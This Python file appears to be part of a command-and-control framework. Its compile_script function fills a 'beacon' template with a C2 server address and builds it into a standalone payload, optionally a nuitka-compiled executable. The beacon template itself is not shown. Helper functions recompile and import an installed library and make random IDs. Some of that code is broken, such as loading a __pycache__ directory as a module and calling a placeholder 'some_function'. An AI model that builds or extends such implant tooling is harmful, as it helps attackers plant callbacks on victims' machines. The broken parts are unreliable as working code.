import os
from .beacons.generate import render_template as beacons_generate
import random
import string
import compileall
import importlib.util
import os
import tempfile
import site


def compile_script(server, beacon_template, output, format):
    content = beacons_generate(beacon_template, c2=server)
    temp_dir = tempfile.mkdtemp()
    base_path = os.getcwd()
    output_file = os.path.join(base_path, output)
    try:
        temp_file = os.path.join(temp_dir, 'temp_script.py')
        with open(temp_file, 'w') as f:
            f.write(content)
        if format == 'exe':
            os.chdir(temp_dir)
            os.system(f'nuitka {temp_file}')
            os.rename(f'temp_script.exe', output_file)
        else:
            try:
                os.rename(temp_file, output_file)
            except Exception as e:
                print(f"Error while renaming file: {e}")

    except Exception as e:
        print(f'Error during compilation: {e}')

    finally:
        os.chdir(base_path)
        if os.path.exists(temp_dir):
            import shutil
            shutil.rmtree(temp_dir)


def compile_library(library_name):
    library_locations = site.getsitepackages()
    library_location = None
    for location in library_locations:
        print(location)
        library_path = os.path.join(location, library_name)
        if os.path.exists(library_path):
            library_location = library_path
            break
    if library_location is not None:
        compileall.compile_dir(library_location, force=True)
        print(f"Le répertoire de la bibliothèque '{library_location}' a été compilé.")
        return library_location
    else:
        raise Exception('Library not found')

def import_compiled_module(module_name):
    module_path = compile_library(module_name)
    bytecode_file = os.path.join(module_path, '__pycache__')
    spec = importlib.util.spec_from_file_location(module_name, bytecode_file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

def generate_random_id(seed):
    random.seed(seed)
    characters = string.ascii_lowercase + string.digits
    random_id = ''.join(random.choice(characters) for _ in range(5))
    return random_id

if __name__ == "__main__":
    library_directory = "loguru"
    main_module = import_compiled_module("loguru")
    main_module.some_function()
    main_module.some_variable = 42
